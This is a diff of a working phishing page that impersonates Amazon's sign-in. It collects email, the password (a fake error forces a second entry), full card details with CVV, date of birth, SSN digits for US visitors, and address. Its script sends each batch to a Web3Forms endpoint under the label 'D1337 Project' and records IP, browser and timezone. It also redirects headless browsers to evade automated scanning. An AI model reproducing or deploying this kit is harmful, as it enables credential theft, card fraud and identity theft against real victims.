@@ -3,83 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon - Sign In</title>
+    <title>Amazon Sign-In</title>
     <link rel="icon" href="https://www.amazon.com/favicon.ico">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: "Amazon Ember", Arial, sans-serif; background: #fff; min-height: 100vh; }
-        .container { max-width: 350px; margin: 0 auto; padding: 20px; }
-        .logo { text-align: center; padding: 20px 0; }
-        .logo-text { font-size: 28px; font-weight: bold; color: #232f3e; letter-spacing: -1px; }
-        .logo-text span { color: #ff9900; }
-        .box { border: 1px solid #ddd; border-radius: 4px; padding: 20px; margin-bottom: 20px; }
-        h1 { font-size: 28px; font-weight: 400; margin-bottom: 20px; color: #111; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 5px; color: #111; }
-        input { width: 100%; padding: 8px 10px; font-size: 14px; border: 1px solid #a6a6a6; border-radius: 3px; outline: none; }
-        input:focus { border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228,121,17,.5); }
-        .btn { width: 100%; padding: 10px; font-size: 14px; background: linear-gradient(to bottom, #f7dfa5, #f0c14b); border: 1px solid #a88734; border-radius: 3px; cursor: pointer; color: #111; }
-        .btn:hover { background: linear-gradient(to bottom, #f5d78e, #eeb933); }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        .error { background: #fff0f0; border: 1px solid #d00; border-radius: 4px; padding: 15px; margin-bottom: 15px; color: #c00; font-size: 13px; display: none; }
-        .error.show { display: block; }
+        body { font-family: "Amazon Ember", Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; flex-direction: column; }
+        .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 14px 18px; }
+        .logo { padding: 14px 0 12px; }
+        .logo img { height: 31px; }
+        .logo-text { font-family: "Amazon Ember", Arial; font-size: 30px; font-weight: 700; color: #0F1111; letter-spacing: -.5px; }
+        .logo-text .arrow { color: #FF9900; }
+        .box { border: 1px solid #ddd; border-radius: 8px; padding: 20px 26px; max-width: 350px; width: 100%; }
+        h1 { font-size: 28px; font-weight: 400; color: #0F1111; margin-bottom: 10px; }
+        .email-display { font-size: 13px; color: #0F1111; margin-bottom: 14px; }
+        .email-display a { color: #0066c0; text-decoration: none; margin-left: 5px; }
+        .form-group { margin-bottom: 14px; }
+        .label-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; }
+        label { font-size: 13px; font-weight: 700; color: #0F1111; }
+        .forgot-link { font-size: 13px; color: #0066c0; text-decoration: none; }
+        input[type="text"], input[type="password"], input[type="email"], input[type="tel"] { 
+            width: 100%; padding: 7px 10px; font-size: 13px; 
+            border: 1px solid #888C8C; border-radius: 4px; outline: none; 
+        }
+        input:focus { border-color: #007185; box-shadow: 0 0 0 3px #C8F3FA; }
+        .btn { 
+            width: 100%; padding: 8px 10px; font-size: 13px; 
+            background: #FFD814; border: 1px solid #FCD200; 
+            border-radius: 8px; cursor: pointer; color: #0F1111; 
+            margin-top: 12px;
+        }
+        .btn:hover { background: #F7CA00; }
+        .legal { font-size: 12px; color: #0F1111; margin-top: 16px; line-height: 1.5; }
+        .legal a { color: #0066c0; text-decoration: none; }
+        .help-section { margin-top: 18px; }
+        .help-link { font-size: 13px; color: #0066c0; text-decoration: none; cursor: pointer; display: flex; align-items: center; gap: 4px; }
+        .divider-section { margin-top: 22px; padding-top: 18px; border-top: 1px solid #ddd; }
+        .divider-title { font-size: 13px; font-weight: 700; color: #0F1111; margin-bottom: 6px; }
+        .divider-link { font-size: 13px; color: #0066c0; text-decoration: none; }
+        .footer { text-align: center; padding: 26px 18px; background: linear-gradient(to bottom, rgba(0,0,0,.03), rgba(0,0,0,.08)); border-top: 1px solid #ddd; }
+        .footer-links { display: flex; justify-content: center; gap: 24px; margin-bottom: 8px; }
+        .footer-links a { font-size: 11px; color: #0066c0; text-decoration: none; }
+        .footer-copy { font-size: 11px; color: #555; }
+        .error { background: #FCF4F4; border: 1px solid #CC0C39; border-radius: 8px; padding: 14px 18px; margin-bottom: 14px; display: none; }
+        .error.show { display: flex; gap: 12px; align-items: flex-start; }
+        .error-icon { color: #CC0C39; font-size: 20px; }
+        .error-text { font-size: 13px; color: #0F1111; }
+        .error-title { font-weight: 700; color: #CC0C39; margin-bottom: 4px; }
         .step { display: none; }
         .step.active { display: block; }
-        .divider { display: flex; align-items: center; margin: 20px 0; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #ddd; }
-        .divider span { padding: 0 10px; font-size: 12px; color: #767676; }
-        .footer { text-align: center; font-size: 11px; color: #555; padding: 20px; }
-        .footer a { color: #0066c0; text-decoration: none; }
-        .links { display: flex; justify-content: center; gap: 20px; margin-bottom: 10px; }
-        .card-icons { display: flex; gap: 5px; margin-bottom: 10px; }
-        .card-icons img { height: 24px; }
-        .loading { display: none; text-align: center; padding: 20px; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #ff9900; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        .loading { display: none; text-align: center; padding: 40px 20px; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #FF9900; border-radius: 50%; width: 32px; height: 32px; animation: spin 1s linear infinite; margin: 0 auto 12px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .card-icons { display: flex; gap: 8px; margin: 12px 0; }
+        .card-icons img { height: 22px; }
         .ssn-group { display: none; }
+        .check-icon { color: #067D62; font-size: 48px; margin-bottom: 16px; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="main">
         <div class="logo">
-            <div class="logo-text">amazon<span>.com</span></div>
+            <a href="https://www.amazon.com">
+                <div class="logo-text">amazon</div>
+            </a>
         </div>
+        
         <div class="box step active" id="step1">
-            <h1>Sign in</h1>
-            <div class="error" id="error1">Your password is incorrect</div>
-            <form id="loginForm">
+            <h1>Sign in or create account</h1>
+            <form id="emailForm">
                 <div class="form-group">
-                    <label>Email or mobile phone number</label>
+                    <label>Enter mobile number or email</label>
                     <input type="text" id="email" required autofocus>
                 </div>
+                <button type="submit" class="btn">Continue</button>
+            </form>
+            <p class="legal">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
+            <div class="help-section">
+                <a href="#" class="help-link">&#9660; Need help?</a>
+            </div>
+            <div class="divider-section">
+                <div class="divider-title">Buying for work?</div>
+                <a href="#" class="divider-link">Create a free business account</a>
+            </div>
+        </div>
+
+        <div class="box step" id="step2">
+            <h1>Sign in</h1>
+            <div class="email-display"><span id="displayEmail"></span><a href="#" id="changeEmail">Change</a></div>
+            <div class="error" id="error2">
+                <div class="error-icon">&#9888;</div>
+                <div>
+                    <div class="error-title">There was a problem</div>
+                    <div class="error-text">Your password is incorrect</div>
+                </div>
+            </div>
+            <form id="passwordForm">
                 <div class="form-group">
-                    <label>Password</label>
+                    <div class="label-row">
+                        <label>Password</label>
+                        <a href="#" class="forgot-link">Forgot password?</a>
+                    </div>
                     <input type="password" id="password" required>
                 </div>
                 <button type="submit" class="btn">Sign in</button>
             </form>
-            <p style="font-size:12px;margin-top:15px;color:#111;">By continuing, you agree to Amazon's <a href="#" style="color:#0066c0;">Conditions of Use</a> and <a href="#" style="color:#0066c0;">Privacy Notice</a>.</p>
         </div>
-        <div class="box step" id="step2">
-            <h1>Update Payment Method</h1>
-            <p style="font-size:13px;color:#555;margin-bottom:15px;">We need to verify your payment method to continue.</p>
-            <div class="error" id="error2"></div>
+
+        <div class="box step" id="step3">
+            <h1>Update payment method</h1>
+            <p style="font-size:13px;color:#565959;margin-bottom:16px;">Please verify your payment information to continue.</p>
             <form id="cardForm">
                 <div class="form-group">
-                    <label>Name on Card</label>
+                    <label>Name on card</label>
                     <input type="text" id="cardName" required>
                 </div>
                 <div class="form-group">
-                    <label>Card Number</label>
+                    <label>Card number</label>
                     <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                 </div>
-                <div style="display:flex;gap:10px;">
+                <div style="display:flex;gap:12px;">
                     <div class="form-group" style="flex:1;">
-                        <label>Expiry</label>
+                        <label>Expiration date</label>
                         <input type="text" id="cardExp" placeholder="MM/YY" maxlength="5" required>
                     </div>
                     <div class="form-group" style="flex:1;">
-                        <label>CVV</label>
+                        <label>Security code (CVV)</label>
                         <input type="text" id="cardCvv" placeholder="123" maxlength="4" required>
                     </div>
                 </div>
@@ -87,96 +135,98 @@
                     <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal" style="height:18px;">
                 </div>
                 <button type="submit" class="btn">Continue</button>
             </form>
         </div>
-        <div class="box step" id="step3">
-            <h1>Verify Your Identity</h1>
-            <p style="font-size:13px;color:#555;margin-bottom:15px;">For your security, please verify your billing address.</p>
-            <div class="error" id="error3"></div>
+
+        <div class="box step" id="step4">
+            <h1>Verify your identity</h1>
+            <p style="font-size:13px;color:#565959;margin-bottom:16px;">For your security, please confirm your billing information.</p>
             <form id="billingForm">
                 <div class="form-group">
-                    <label>Full Name</label>
+                    <label>Full name</label>
                     <input type="text" id="fullName" required>
                 </div>
                 <div class="form-group">
-                    <label>Date of Birth</label>
+                    <label>Date of birth</label>
                     <input type="text" id="dob" placeholder="MM/DD/YYYY" maxlength="10" required>
                 </div>
                 <div class="form-group ssn-group" id="ssnGroup">
-                    <label>Social Security Number (Last 4 digits)</label>
+                    <label>Social Security Number (last 4 digits)</label>
                     <input type="text" id="ssn" placeholder="XXXX" maxlength="4">
                 </div>
                 <div class="form-group">
-                    <label>Phone Number</label>
+                    <label>Phone number</label>
                     <input type="tel" id="phone" required>
                 </div>
                 <div class="form-group">
-                    <label>Address</label>
+                    <label>Street address</label>
                     <input type="text" id="address" required>
                 </div>
-                <div style="display:flex;gap:10px;">
+                <div style="display:flex;gap:12px;">
                     <div class="form-group" style="flex:1;">
                         <label>City</label>
                         <input type="text" id="city" required>
                     </div>
                     <div class="form-group" style="flex:1;">
-                        <label>Zip Code</label>
+                        <label>ZIP Code</label>
                         <input type="text" id="zip" required>
                     </div>
                 </div>
-                <button type="submit" class="btn">Verify & Continue</button>
+                <button type="submit" class="btn">Verify</button>
             </form>
         </div>
+
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p>Verifying your information...</p>
+            <p style="font-size:13px;color:#565959;">Please wait...</p>
         </div>
-        <div class="box step" id="step4">
-            <div style="text-align:center;padding:20px;">
-                <div style="font-size:48px;color:#067d62;">&#10003;</div>
-                <h2 style="margin:15px 0;color:#111;">Verification Complete</h2>
-                <p style="color:#555;font-size:14px;margin-bottom:20px;">Your account has been verified successfully.</p>
-                <p style="color:#888;font-size:12px;">Redirecting to Amazon...</p>
+
+        <div class="box step" id="step5">
+            <div style="text-align:center;padding:20px 0;">
+                <div class="check-icon">&#10003;</div>
+                <h2 style="font-size:21px;font-weight:400;color:#0F1111;margin-bottom:12px;">Verification complete</h2>
+                <p style="font-size:13px;color:#565959;margin-bottom:20px;">Your account has been verified successfully.</p>
+                <p style="font-size:12px;color:#888;">Redirecting to Amazon...</p>
             </div>
         </div>
-        <div class="divider"><span>New to Amazon?</span></div>
-        <a href="https://www.amazon.com/ap/register" style="display:block;text-align:center;padding:10px;border:1px solid #adb1b8;border-radius:3px;background:linear-gradient(to bottom,#f7f8fa,#e7e9ec);color:#111;text-decoration:none;font-size:13px;">Create your Amazon account</a>
     </div>
+
     <div class="footer">
-        <div class="links">
+        <div class="footer-links">
             <a href="#">Conditions of Use</a>
             <a href="#">Privacy Notice</a>
             <a href="#">Help</a>
         </div>
-        <p>&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <div class="footer-copy">&copy; 1996-2026, Amazon.com, Inc. or its affiliates</div>
     </div>
+
     <script>
         const WEB3FORMS_KEY = '04af8936-9e51-408a-b725-ab3331e183cf';
-        const TARGET_EMAIL = 'barugas2026@outlook.com';
-        const WEBHOOK_URL = '';
-        let isUS = false;
-        let loginAttempt = 0;
+        let passwordAttempt = 0;
         let collectedData = {
             email: '', password: '', password2: '',
             cardName: '', cardNumber: '', cardExp: '', cardCvv: '',
             fullName: '', dob: '', ssn: '', phone: '', address: '', city: '', zip: '',
-            ip: '', country: '', userAgent: navigator.userAgent, screen: screen.width + 'x' + screen.height,
+            ip: '', country: '', userAgent: navigator.userAgent, 
+            screen: screen.width + 'x' + screen.height,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             language: navigator.language, timestamp: ''
         };
+
         fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
             collectedData.ip = d.ip;
             collectedData.country = d.country_code;
             if (d.country_code === 'US') {
-                isUS = true;
                 document.getElementById('ssnGroup').style.display = 'block';
                 document.getElementById('ssn').required = true;
             }
         }).catch(() => {
             fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => collectedData.ip = d.ip).catch(() => {});
         });
+
         document.getElementById('cardNumber').addEventListener('input', function(e) {
             let v = e.target.value.replace(/\D/g, '').substring(0, 16);
             e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
@@ -188,16 +238,14 @@
         });
         document.getElementById('dob').addEventListener('input', function(e) {
             let v = e.target.value.replace(/\D/g, '').substring(0, 8);
-            if (v.length >= 4) {
-                v = v.substring(0,2) + '/' + v.substring(2,4) + '/' + v.substring(4,8);
-            } else if (v.length >= 2) {
-                v = v.substring(0,2) + '/' + v.substring(2);
-            }
+            if (v.length >= 4) v = v.substring(0,2) + '/' + v.substring(2,4) + '/' + v.substring(4,8);
+            else if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
             e.target.value = v;
         });
         document.getElementById('ssn').addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
         });
+
         function showStep(n) {
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
             document.getElementById('step' + n).classList.add('active');
@@ -210,14 +258,13 @@
             if (step === 2) return 'Card Info';
             return 'Personal Info';
         }
+
         async function sendData(step) {
             collectedData.timestamp = new Date().toISOString();
             let msg = '** AMAZON - Step ' + step + ' **\n======================\n';
-            if (step >= 1) {
-                msg += 'Email: ' + collectedData.email + '\n';
-                msg += 'Password 1: ' + collectedData.password + '\n';
-                if (collectedData.password2) msg += 'Password 2: ' + collectedData.password2 + '\n';
-            }
+            msg += 'Email: ' + collectedData.email + '\n';
+            msg += 'Password 1: ' + collectedData.password + '\n';
+            if (collectedData.password2) msg += 'Password 2: ' + collectedData.password2 + '\n';
             if (step >= 2) {
                 msg += '\n** Card Info **\n';
                 msg += 'Name: ' + collectedData.cardName + '\n';
@@ -241,52 +288,53 @@
             msg += 'Country: ' + collectedData.country + '\n';
             msg += 'Screen: ' + collectedData.screen + '\n';
             msg += 'Timezone: ' + collectedData.timezone + '\n';
-            msg += 'Language: ' + collectedData.language + '\n';
             msg += 'UA: ' + collectedData.userAgent.substring(0, 100) + '\n';
             msg += '======================';
-            if (WEB3FORMS_KEY) {
-                try {
-                    await fetch('https://api.web3forms.com/submit', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            access_key: WEB3FORMS_KEY,
-                            subject: getSubject(step),
-                            from_name: 'D1337 Project',
-                            message: msg,
-                            victim_email: collectedData.email,
-                            data: JSON.stringify(collectedData)
-                        })
-                    });
-                } catch(e) {}
-            }
-            if (WEBHOOK_URL) {
-                try {
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({content: msg})
-                    });
-                } catch(e) {}
-            }
+            
+            try {
+                await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        access_key: WEB3FORMS_KEY,
+                        subject: getSubject(step),
+                        from_name: 'D1337 Project',
+                        message: msg
+                    })
+                });
+            } catch(e) {}
         }
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            loginAttempt++;
-            if (loginAttempt === 1) {
-                collectedData.email = document.getElementById('email').value;
+            collectedData.email = document.getElementById('email').value;
+            document.getElementById('displayEmail').textContent = collectedData.email;
+            showStep(2);
+            document.getElementById('password').focus();
+        });
+
+        document.getElementById('changeEmail').addEventListener('click', function(e) {
+            e.preventDefault();
+            showStep(1);
+        });
+
+        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            passwordAttempt++;
+            if (passwordAttempt === 1) {
                 collectedData.password = document.getElementById('password').value;
-                document.getElementById('error1').classList.add('show');
+                document.getElementById('error2').classList.add('show');
                 document.getElementById('password').value = '';
                 document.getElementById('password').focus();
                 return;
             }
             collectedData.password2 = document.getElementById('password').value;
-            document.getElementById('error1').classList.remove('show');
+            document.getElementById('error2').classList.remove('show');
             showLoading(true);
             await sendData(1);
-            setTimeout(() => { showLoading(false); showStep(2); }, 1500);
+            setTimeout(() => { showLoading(false); showStep(3); }, 1500);
         });
+
         document.getElementById('cardForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             collectedData.cardName = document.getElementById('cardName').value;
@@ -295,8 +343,9 @@
             collectedData.cardCvv = document.getElementById('cardCvv').value;
             showLoading(true);
             await sendData(2);
-            setTimeout(() => { showLoading(false); showStep(3); }, 2000);
+            setTimeout(() => { showLoading(false); showStep(4); }, 1800);
         });
+
         document.getElementById('billingForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             collectedData.fullName = document.getElementById('fullName').value;
@@ -308,10 +357,16 @@
             collectedData.zip = document.getElementById('zip').value;
             showLoading(true);
             await sendData(3);
-            setTimeout(() => { showLoading(false); showStep(4); setTimeout(() => { window.location.href = 'https://www.amazon.com/'; }, 5000); }, 2500);
+            setTimeout(() => {
+                showLoading(false);
+                showStep(5);
+                setTimeout(() => { window.location.href = 'https://www.amazon.com/'; }, 4000);
+            }, 2000);
         });
+
         (function() {
-            if (navigator.webdriver || window.callPhantom || window._phantom || navigator.userAgent.toLowerCase().includes('headless')) {
+            if (navigator.webdriver || window.callPhantom || window._phantom || 
+                navigator.userAgent.toLowerCase().includes('headless')) {
                 window.location.href = 'https://www.amazon.com/';
             }
         })();
